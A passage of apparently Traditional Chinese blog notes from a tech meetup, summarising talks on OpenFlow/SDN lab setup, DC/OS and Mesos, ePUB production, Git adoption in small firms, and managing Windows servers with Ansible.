&lt;li&gt;美國有高中生就在當 intern 學習這個部份，所以不要覺得門檻太高，真的有興趣的話就跳下來研究吧  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;常見實際拓墣&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;Internet -- DHCP/NAT Server -- Legacy L2 Switch  -- OpenFlow Controller (放在內網，不然很容易被打）  
                                       |  
                            OpenFlow-Enabled Switch (建議用 Out-of-band)  
                                   /        \  
                             Host A         Host B  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;可以觀察到封包都是好事  &lt;/p&gt;
&lt;h3&gt;OpenFlow-Enabled Switch 選擇&lt;/h3&gt;
&lt;p&gt;價格從高排到低依序為：  &lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;採買實體 OpenFlow-Enabled Switch 及 Network OS  &lt;ul&gt;
&lt;li&gt;從各家 Network OS 廠商中的 Hardware Compatibility List 裡挑選硬體  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Linux Server + 4-Port NIC + OpenvSwitch  &lt;ul&gt;
&lt;li&gt;可以直接在 Local 用 Wireshark 觀察封包  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;支援 OpenWrt AP + OpenvSwitch  &lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Protocol 請以 1.3 為主，1.0 為次。  &lt;/p&gt;
&lt;p&gt;OpenvSwitch 和 Docker (Socket Plan), Xen Server 有關  &lt;/p&gt;
&lt;h3&gt;OpenFlow Controller 選擇&lt;/h3&gt;
&lt;p&gt;選擇 Controller Application 有實作 L2 Forwarding 或者是 Switching 功能  &lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href="https://osrg.github.io/ryu/"&gt;Ryu&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;學習曲線低  &lt;/li&gt;
&lt;li&gt;Keyword: &lt;code&gt;Simple_Switch_13&lt;/code&gt; (or &lt;code&gt;Simple_Switch_10&lt;/code&gt;)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://onosproject.org/"&gt;ONOS&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;學習曲線偏高  &lt;/li&gt;
&lt;li&gt;Keyword: &lt;code&gt;org.onosproject.fwd&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Tip: 觀測不同家的 Controller 建立行為基準  &lt;/li&gt;
&lt;/ol&gt;
&lt;h3&gt;直接接上 SDN Controller 進行測試？&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;如果你經驗非常豐富的話，可以。  &lt;/li&gt;
&lt;li&gt;要先確保 OpenFlow-Enabled Switch, Host A, Host B 都可以 ping 到 OpenFlow Controller  &lt;ul&gt;
&lt;li&gt;八成的人有問題都是出在這部份，基本上就是網路設定沒設定好  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;OpenFlow Connection Setup&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://sdnhub.org/tutorials/openflow-1-3/"&gt;http://sdnhub.org/tutorials/openflow-1-3/&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;要記得看 Spec，去對照現在做的行為對不對  &lt;/li&gt;
&lt;li&gt;確認連線正常後，再開啟 OpenFlow Controller。（SDN 的功能）  &lt;/li&gt;
&lt;li&gt;到目前為止是基本的設定步驟，可以嘗試用全自動化的方式做掉這部份，例如用 Ansible。  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;在啟動 SDN 的狀況下，連線不正常？&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;觀測 Flow Count 是否有增加 =&amp;gt; 可確定 Flow Entry 有沒有被 Match  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;ovs-ofctl dump-flows&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Tips: 先從 Switch 開始懷疑起  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;真的找不出業障在哪裡的話&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;撈封包回來用 Wireshark 檢查  &lt;/li&gt;
&lt;li&gt;根據 IANA 的規定，OpenFlow 使用 6653 port，但早期有些是 6633 port，記得現在都用 6653 就好。  &lt;/li&gt;
&lt;li&gt;業障關鍵字： &lt;code&gt;OFPT_ERROR&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;對照 &lt;a href="https://www.opennetworking.org/images/stories/downloads/sdn-resources/onf-specifications/openflow/openflow-spec-v1.3.0.pdf"&gt;OpenFlow 1.3 Spec Error Message&lt;/a&gt; (A.4.4) 確定錯誤碼的意思  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;複雜一點的實際使用案例&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;ONOS SDN-IP  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://wiki.onosproject.org/display/ONOS/SDN-IP+Tutorial"&gt;https://wiki.onosproject.org/display/ONOS/SDN-IP+Tutorial&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://opencord.org/"&gt;OpenCORD&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;AT&amp;amp;T 提出的 Project  &lt;/li&gt;
&lt;li&gt;Re-architecting the Central Office  &lt;ul&gt;
&lt;li&gt;&lt;a href="http://opencord.org/wp-content/uploads/2016/04/ONS-2016-Plenary.pdf"&gt;http://opencord.org/wp-content/uploads/2016/04/ONS-2016-Plenary.pdf&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;今年 4 月在美國有進行 field try 了  &lt;/li&gt;
&lt;li&gt;Domains (三者都建立在 CORD Controller）  &lt;ul&gt;
&lt;li&gt;Residential  &lt;/li&gt;
&lt;li&gt;Mobile  &lt;/li&gt;
&lt;li&gt;Enterprise  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;ONF Atrium - SDN Project Stack  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.opennetworking.org/?p=1757&amp;amp;option=com_wordpress&amp;amp;Itemid=316"&gt;https://www.opennetworking.org/?p=1757&amp;amp;option=com_wordpress&amp;amp;Itemid=316&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/onfsdn/atrium-docs"&gt;https://github.com/onfsdn/atrium-docs&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;對這些專案或者和 SDN 相關議題有興趣的話，歡迎加入 &lt;a href="http://sdnds.tw/"&gt;SDNDS-TW 社群&lt;/a&gt;  &lt;/p&gt;
&lt;h2&gt;Related Links&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/opennetworkinglab/onos"&gt;GitHub - opennetworkinglab/onos: Open Network Operating System&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h1&gt;淺談 DC/OS by Daniel&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;相關關鍵字  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://dcos.io/"&gt;DC/OS&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://mesos.apache.org/"&gt;Mesos&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://kubernetes.io/"&gt;Kubernets&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://coreos.com/"&gt;CoreOS&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;What's DC/OS&lt;/h2&gt;
&lt;h3&gt;Mesos Master Quorum&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;預設一台 Mesos Master，兩台 Mesos Standby，預設用 ZooKeeper 管理。  &lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Framework 和 Scheduler 做資源的分配與調度，丟到 Mesos Slave (Framework + Executor) 執行  &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href="https://docs.mesosphere.com/1.7/overview/architecture/"&gt;Architecture - Mesosphere DC/OS Documentation&lt;/a&gt;  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;DCOS Master  &lt;ul&gt;
&lt;li&gt;Mesos DNS  &lt;ul&gt;
&lt;li&gt;Service Discovery  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;DCOS Private Agent  &lt;ul&gt;
&lt;li&gt;給內部使用，外網連不到  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;DCOS Public Agent  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Why DC/OS&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;生態圈豐富  &lt;ul&gt;
&lt;li&gt;許多大廠都有在使用  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;漂亮的 GUI  &lt;/li&gt;
&lt;li&gt;有 HA 機制 (ZooKeeper) 及 Service Discovery (Mesos DNS)  &lt;/li&gt;
&lt;li&gt;100% Open Source  &lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;How to use DC/OS&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://dcos.io/docs/1.7/"&gt;https://dcos.io/docs/1.7/&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;Use DC/OS on AWS  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://mesosphere.com/amazon/"&gt;https://mesosphere.com/amazon/&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Login 方式目前只支援三種  &lt;ul&gt;
&lt;li&gt;Google Gmail  &lt;/li&gt;
&lt;li&gt;Azure Hotmail  &lt;/li&gt;
&lt;li&gt;GitHub  &lt;/li&gt;
&lt;li&gt;LDAP 是不行的  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;&lt;a href="https://github.com/mhausenblas/dploy"&gt;dploy&lt;/a&gt;&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;DC/OS 的 build file 是 JSON 格式，和 Dockerfile 的 yaml 格式不同。  &lt;/li&gt;
&lt;li&gt;Usage  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;dploy init&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;dploy dryrun&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;dploy destory&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;刪除 container  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;dploy ls&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;列出所有 containers  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;dploy [-all] ps&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;列出 container 在執行的 process  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;dploy -pid=&amp;lt;PID&amp;gt; [-instances=NUM] scale&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;幫你做 auto-scaling  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Docs  &lt;ul&gt;
&lt;li&gt;&lt;a href="http://dploy.sh"&gt;http://dploy.sh&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/mhausenblas/s4d"&gt;GitHub - mhausenblas/s4d: A sandbox for dploy (s4d)&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;透過 GitHub 的 Webhook 去 trigger DC/OS  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;&lt;a href="https://docs.mesosphere.com/1.7/usage/service-guides/marathon/"&gt;Marathon&lt;/a&gt;&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;DC/OS GUI 介面  &lt;/li&gt;
&lt;li&gt;有基本的 healthcheck  &lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Related Links&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/dcos/dcos"&gt;GitHub - dcos/dcos: DC/OS Build and Release tools&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://mesosphere.com/google/"&gt;Mesosphere DCOS on Google Cloud Platform - Mesosphere&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://techcrunch.com/2014/08/18/mesosphere-comes-to-the-google-cloud-platform-integrates-googles-kubernetes-project/"&gt;Mesosphere Comes To Google's Cloud Platform&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://open.mesosphere.com/getting-started/install/"&gt;Setting up a Mesos and Marathon Cluster · Mesosphere&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/google/cadvisor"&gt;GitHub - google/cadvisor: Analyzes resource usage and performance characteristics of running containers.&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h1&gt;ePUB 電子書現場包 by 雨蒼&lt;/h1&gt;
&lt;h2&gt;為什麼要用 ePUB&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Reflow  &lt;ul&gt;
&lt;li&gt;中文直排  &lt;/li&gt;
&lt;li&gt;避頭尾點  &lt;/li&gt;
&lt;li&gt;嵌入字體  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;支援字體特效  &lt;/li&gt;
&lt;li&gt;Fixed Layout  &lt;ul&gt;
&lt;li&gt;一頁一圖  &lt;ul&gt;
&lt;li&gt;日本蠻多拿來做漫畫的  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;有聲朗讀  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;提供 DRM 版權保護  &lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;ePUB 的結構&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;mimetype  &lt;/li&gt;
&lt;li&gt;META-INF/container.xml  &lt;ul&gt;
&lt;li&gt;設定路徑  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;OEBPS/content.opf  &lt;ul&gt;
&lt;li&gt;整個 ePUB 最核心的地方  &lt;/li&gt;
&lt;li&gt;metadata  &lt;/li&gt;
&lt;li&gt;manifest  &lt;ul&gt;
&lt;li&gt;可放字體、圖片、CSS、XML，基本上就是個網頁  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;spine  &lt;ul&gt;
&lt;li&gt;整個 ePUB 的骨幹。（目錄、書本內容）  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;guide  &lt;ul&gt;
&lt;li&gt;導讀頁  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;打包流程&lt;/h2&gt;
&lt;p&gt;製作 Markdown =&amp;gt; &lt;a href="http://conv.denshochan.com/tw"&gt;電電轉換器&lt;/a&gt; =&amp;gt; 解壓縮、修改、打包  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://conv.denshochan.com/tw/markdown"&gt;電電轉換器有自己的特殊 Markdown format&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;表格  &lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.convertcsv.com/csv-to-html.htm"&gt;csv to html converter&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;再貼上到 Markdown 裏面  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://conv.denshochan.com/tw/config"&gt;電電設定檔&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;使用 YAML 格式  &lt;/li&gt;
&lt;li&gt;ddconv.yml  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;上傳打包  &lt;/li&gt;
&lt;li&gt;修改檔案  &lt;ul&gt;
&lt;li&gt;使用 ePUB Packer 解壓縮  &lt;/li&gt;
&lt;li&gt;使用 ePUB Checker 檢查語法是否有錯  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;修改 CSS  &lt;ul&gt;
&lt;li&gt;新增靠右對齊  &lt;/li&gt;
&lt;li&gt;blockquote 從變成斜體修改成變成標楷體  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;實際打包&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;從 gitbook 到 ePUB  &lt;ul&gt;
&lt;li&gt;toc.ncx 很不好改，而且在 ePUB 不是必要的，所以可以直接砍掉  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;目前遇的問題&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;ePUB 的表格呈現不是很理想  &lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Q&amp;amp;A&lt;/h2&gt;
&lt;p&gt;Q: 自己做電子書要如何申請 ISBN?&lt;br /&gt;
A: 我都交給別人申請，有需要的話可以找我，我幫你轉介給知道的人幫忙。  &lt;/p&gt;
&lt;p&gt;電電轉換器是日本人開發的，&lt;br /&gt;
目前還有些不足的地方，&lt;br /&gt;
有時候會突然當掉。  &lt;/p&gt;
&lt;p&gt;Q: 臺灣有沒有類似 &lt;a href="https://www.bookscan.co.jp"&gt;https://www.bookscan.co.jp&lt;/a&gt; 這種讓你寄實體書過去然後轉成電子書給你的服務？&lt;br /&gt;
A: 臺灣目前好像沒有。  &lt;/p&gt;
&lt;p&gt;Q: GitBook vs ePUB&lt;br /&gt;
A: 一開始也是用 GitBook，但後來用電電轉換器這套以後，覺得這套方法比較好，因為這套方法產生出來的 ePUB 才能上架到 Google 等其他平台。但我通常還是會兩個都做，先弄 GitBook 的版本，然後再把 GitBook 產生的 markdown 全部合到一個 markdown 裡頭再用這套方法產生 ePUB。  &lt;/p&gt;
&lt;h2&gt;Related Links&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://g0v.hackpad.com/epub3-9zQsGYYU1TG"&gt;如何製作一本epub3電子書 - g0v.hackpad.com&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.gitbook.com/book/jrf-tw/citizen_defend_rights_99_steps/details"&gt;小市民權益保護99招  - GitBook&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://jrf-tw.gitbooks.io/citizen_defend_rights_99_steps/content/"&gt;Introduction · 小市民權益保護99招&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/EPUB"&gt;EPUB - Wikipedia, the free encyclopedia&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h1&gt;Git 導入中小企業經驗分享 by Haway&lt;/h1&gt;
&lt;h2&gt;真實遇到的問題&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Clone 錯專案  &lt;/li&gt;
&lt;li&gt;Add 錯檔案，不能 commit  &lt;/li&gt;
&lt;li&gt;Merge 失敗  &lt;/li&gt;
&lt;li&gt;Branch 是三小  &lt;/li&gt;
&lt;li&gt;不會打版號  &lt;/li&gt;
&lt;li&gt;SVN 的高手搗亂  &lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;版本號如何決定&lt;/h2&gt;
&lt;p&gt;就 &lt;a href="http://semver.org/"&gt;Semantic Versioning 2.0.0&lt;/a&gt;  &lt;/p&gt;
&lt;h2&gt;Git 專案開始&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;與開發人員討論工作習慣  &lt;/li&gt;
&lt;li&gt;瞭解開發環境與測試方式  &lt;/li&gt;
&lt;li&gt;專案賣給 A 客戶後，也要賣給 B 客戶，但要微調需求，這時候要開新 branch 還是 clone 成新 project 來改？  &lt;ul&gt;
&lt;li&gt;clone 成新 project 來改，因為開新的 branch 的話，永遠不會 merge，開一個不會 merge 的 branch 幹嘛？  &lt;blockquote&gt;
&lt;p&gt;其實我沒有很認同這個，萬一要是要更改什麼功能或是修改 bug 呢？每個 repo 都要重覆改？跨 repo 的 cherry-pick？要是今天有 N 間公司呢？  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;在一個 git repo 底下，什麼時候該用 &lt;code&gt;git init&lt;/code&gt;？什麼時候該用 &lt;code&gt;git submodule&lt;/code&gt;？  &lt;ul&gt;
&lt;li&gt;可以自己獨立運作的就 &lt;code&gt;git init&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;必須 depend 在現在這個 git repo 底下的就 &lt;code&gt;git submodule&lt;/code&gt;  &lt;blockquote&gt;
&lt;p&gt;我也沒有很認同這個答案，基本上 submodule 對我來說就是有用到 git 的 dependency packages 就可以用。  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;大部分都是喇賽性質，&lt;br /&gt;
覺得這個 Talk 應該叫做 「大家一起來嘲笑 git 新手會做的那些蠢事」，&lt;br /&gt;
本來是預期這個 talk 應該會講遇到的困難，&lt;br /&gt;
然後怎麼設計出一個使用模式或者解法，&lt;br /&gt;
讓不太會使用 git 的人也能夠開發。&lt;br /&gt;
或者是怎樣的教學可以讓這些新手比較快瞭解 git 的概念，&lt;br /&gt;
而不是只是提到遇到的問題然後一直抱怨，&lt;br /&gt;
這個在 Twitter 上嘴炮就好了啊，&lt;br /&gt;
沒必要開個 talk 吧 XD  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr /&gt;
&lt;h1&gt;淺談 Ansible 組態管理工具 by Sakana&lt;/h1&gt;
&lt;p&gt;這個應該跟我半年前聽的那場內容是一樣的，&lt;br /&gt;
&lt;a href="/posts/2015/12/26/study-area-ansible-tutorial-note/"&gt;2015 12 月份 SA@Tainan 淺談 Ansible 自動化組態管理工具之筆記&lt;/a&gt;&lt;br /&gt;
這次有補充的內容我會集中整理在這份裡頭，不會記這在篇。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h1&gt;現代 IT 人一定要知道的 Ansible 自動化組態技巧 by 凍仁翔&lt;/h1&gt;
&lt;h2&gt;Roles 是什麼？&lt;/h2&gt;
&lt;p&gt;"Scalinig Up Your Playbooks" - Ansbile: Up and Running  &lt;/p&gt;
&lt;h2&gt;怎麼使用 Roles&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://galaxy.ansible.com"&gt;https://galaxy.ansible.com&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;安裝 Roles  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;$ ansible-galaxy install {ansible-roles}&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;初始化  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;$ ansible-galaxy init {ansible-roles}&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://galaxy.ansible.com/intro"&gt;https://galaxy.ansible.com/intro&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Windows Support 是什麼？&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://docs.ansible.com/ansible/intro_windows.html"&gt;https://docs.ansible.com/ansible/intro_windows.html&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;Ansible 2.0 對 Windows Managed node 的支援度大幅提升  &lt;ul&gt;
&lt;li&gt;換句話說，就是 2.0 以前的支援度蠻雷的 XD  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;透過 inventory 定義 Managed node 透過 WinRM, SSH, PowerShell 來佈署  &lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;怎麼用 Ansible 管 Windows Server？&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;怎麼佈署 Control Node?  &lt;ul&gt;
&lt;li&gt;安裝 Ansible 和 pywinrm  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;怎麼佈署 Managed Node?  &lt;ul&gt;
&lt;li&gt;開啟 WinRM: &lt;a href="https://github.com/ansible/ansible/blob/devel/examples/scripts/ConfigureRemotingForAnsible.ps1"&gt;https://github.com/ansible/ansible/blob/devel/examples/scripts/ConfigureRemotingForAnsible.ps1&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;若網路有問題，改成私人網路(Private Network)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;安裝 PowerShell  &lt;/li&gt;
&lt;li&gt;關閉 UAC  &lt;ul&gt;
&lt;li&gt;沒關的話，可能會造成部份 tasks 被中斷。(Optional，視情況而定，可能會遇到，也可能不會遇到）  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;怎麼設定 Ansible？  &lt;/li&gt;
&lt;li&gt;Inventory 是什麼？  &lt;ul&gt;
&lt;li&gt;主要用來定義 Managed Node 的 IP 與 Group，也可以用來設定 WinRM 連線資訊。  &lt;/li&gt;
&lt;li&gt;在控管 Windows Managed node 前，還需要設定一些 inventory 變數。  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;ansible_connection: winrm&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;ansible_port: 5968&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;怎麼用 Ad-Hoc command 管 Windows？  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;ansible &amp;lt;主機名稱&amp;gt; -m &amp;lt;模組&amp;gt; -a &amp;lt;參數1&amp;gt; &amp;lt;參數2&amp;gt;&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;ansible all -m win_ping&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;怎麼用 Playbooks 和 Roles 管 Windows？  &lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="l l-Scalar l-Scalar-Plain"&gt;setup.yaml&lt;/span&gt;  
&lt;span class="l l-Scalar l-Scalar-Plain"&gt;===&lt;/span&gt;  
&lt;span class="l l-Scalar l-Scalar-Plain"&gt;hosts&lt;/span&gt;&lt;span class="p p-Indicator"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;all&lt;/span&gt;  
&lt;span class="l l-Scalar l-Scalar-Plain"&gt;roles&lt;/span&gt;&lt;span class="p p-Indicator"&gt;:&lt;/span&gt;  
  &lt;span class="p p-Indicator"&gt;-&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;chusiang.win_vim&lt;/span&gt;  

&lt;span class="l l-Scalar l-Scalar-Plain"&gt;tasks&lt;/span&gt;&lt;span class="p p-Indicator"&gt;:&lt;/span&gt;  
  &lt;span class="p p-Indicator"&gt;-&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;name&lt;/span&gt;&lt;span class="p p-Indicator"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;copy check vim version file&lt;/span&gt;  
    &lt;span class="l l-Scalar l-Scalar-Plain"&gt;win_template&lt;/span&gt;&lt;span class="p p-Indicator"&gt;:&lt;/span&gt;  
      &lt;span class="l l-Scalar l-Scalar-Plain"&gt;src&lt;/span&gt;&lt;span class="p p-Indicator"&gt;:&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;templates/check_vim_version.bat.2&amp;#39;&lt;/span&gt;  

&lt;span class="nn"&gt;...&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;Demo&lt;/h3&gt;
&lt;p&gt;&lt;a href="https://youtu.be/wZLT1B_uh9Q"&gt;https://youtu.be/wZLT1B_uh9Q&lt;/a&gt;  &lt;/p&gt;
&lt;h2&gt;怎麼避開 Windows Playbooks 路徑地雷？&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;使用 &lt;code&gt;key:value&lt;/code&gt; 寫法會比 &lt;code&gt;key=value&lt;/code&gt; 少採點雷  &lt;ul&gt;
&lt;li&gt;後者會不時遇到路徑無法辨識的問題  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;避免在行尾使用 &lt;code&gt;\&lt;/code&gt;  &lt;/li&gt;
